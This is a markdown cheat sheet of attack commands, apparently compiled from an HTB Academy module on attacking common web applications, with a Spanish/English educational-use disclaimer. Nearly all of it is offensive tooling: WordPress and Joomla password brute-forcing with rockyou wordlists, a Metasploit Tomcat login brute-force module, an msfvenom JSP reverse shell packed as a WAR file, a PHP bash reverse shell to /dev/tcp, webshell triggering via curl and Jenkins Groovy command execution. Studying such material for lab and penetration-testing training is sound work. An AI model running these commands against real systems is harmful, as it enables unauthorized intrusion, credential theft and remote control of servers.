# Attacking Common Applications — Cheat Sheet

> **Fuente / Source:** [m4riio21/HTB-Academy-Cheatsheets](https://github.com/m4riio21/HTB-Academy-Cheatsheets) (`attacking-common-apps.md`) — fecha de acceso: 2026-09-24. Módulo HTB Academy: Attacking Common Applications.
> **Autor notas:** Apuromafo (curaduría local).

---

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list` | Nmap scan on common web ports from a scope list (`-oA` all formats). |
| `eyewitness --web -x web_discovery.xml -d <dir>` | Eyewitness screenshots from nmap XML output. |
| `cat web_discovery.xml \| ./aquatone -nmap`                  | Aquatone screenshots from nmap output. |
| `sudo wpscan --url <http://target> --enumerate` | WordPress enumeration with WPScan. |
| `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://target>` | WPScan password attack via xmlrpc. |
| `droopescan scan joomla --url http://<target>` | Joomla scan with droopescan. |
| `sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr <user>` | Joomla brute force. |
| `gobuster dir -u <http://target> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt` | Directory brute forcing with gobuster. |
| `auxiliary/scanner/http/tomcat_mgr_login`                    | Metasploit Tomcat manager login bruteforce module. |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war > backup.war` | JSP reverse shell as WAR file. |
| `nmap -sV -p 8009,8080 <target>` | Enumerate Apache Tomcat and AJP services. |
| `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'");` | PHP reverse shell one-liner. |
| `curl -s http://<target>/path/to/webshell.php?cmd=id` | Trigger a PHP webshell via curl. |
| Groovy `def cmd = "cmd.exe /c dir".execute()` | Jenkins Script Console webshell (Windows). |
| Groovy reverse shell via `ProcessBuilder` + `Socket` | Jenkins Script Console reverse shell. |

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox.

_Fecha de edición: 2026-09-24_
